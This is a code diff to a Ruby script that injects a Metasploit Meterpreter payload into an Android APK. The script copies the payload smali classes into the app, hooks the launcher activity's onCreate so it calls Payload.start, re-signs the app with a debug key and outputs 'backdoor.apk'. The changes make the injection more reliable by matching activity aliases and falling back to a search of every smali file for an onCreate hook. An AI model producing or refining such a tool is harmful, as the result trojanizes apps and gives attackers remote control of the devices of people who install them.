@@ -40,7 +40,7 @@ f.close
 # Find the activity that is opened when you click the app icon
 def findlauncheractivity(amanifest)
     package = amanifest.xpath("//manifest").first['package']
-    activities = amanifest.xpath("//activity")
+    activities = amanifest.xpath("//activity|//activity-alias")
     for activity in activities 
         activityname = activity.attribute("name")
         category = activity.search('category')
@@ -49,7 +49,7 @@ def findlauncheractivity(amanifest)
         end
         for cat in category
             categoryname = cat.attribute('name')
-            if categoryname.to_s == 'android.intent.category.LAUNCHER'
+            if (categoryname.to_s == 'android.intent.category.LAUNCHER' || categoryname.to_s == 'android.intent.action.MAIN')
                 activityname = activityname.to_s
                 unless activityname.start_with?(package)
                     activityname = package + activityname
@@ -60,12 +60,31 @@ def findlauncheractivity(amanifest)
     end
 end
 
+
 launcheractivity = findlauncheractivity(amanifest)
 smalifile = 'original/smali/' + launcheractivity.gsub(/\./, "/") + '.smali'
+begin
+activitysmali = File.read(smalifile)
+rescue Errno::ENOENT
+    #If XML parsing doesn't work to find the launcher activity,
+    #do a string search on the decompiled smali files for the
+    #onCreate() hook, stop when you find it
+	Dir.glob('original/smali/**/*.smali') do |file|
+	  checkFile=File.read(file)
+	  if (checkFile.include?";->onCreate(Landroid/os/Bundle;)V")
+		smalifile = file
+		activitysmali = checkFile
+		break
+	  end
+	end
+end
+if (activitysmali == 0 )
+	print "No hook detected for injection. Exiting.\n"
+	exit(1)
+end
+
 FileUtils.mkdir_p('original/smali/com/metasploit/stage/')
 FileUtils.cp Dir.glob('payload/smali/com/metasploit/stage/Payload*.smali'), 'original/smali/com/metasploit/stage/'
-
-activitysmali = File.read(smalifile)
 activitycreate = ';->onCreate(Landroid/os/Bundle;)V'
 payloadhook = activitycreate + "\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
 hookedsmali = activitysmali.gsub(activitycreate, payloadhook)
@@ -75,4 +94,3 @@ File.open(smalifile, "w") {|file| file.puts hookedsmali }
 `jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA backdoor.apk androiddebugkey`
 
 puts "Created backdoor.apk with meterpreter payload\n"
-
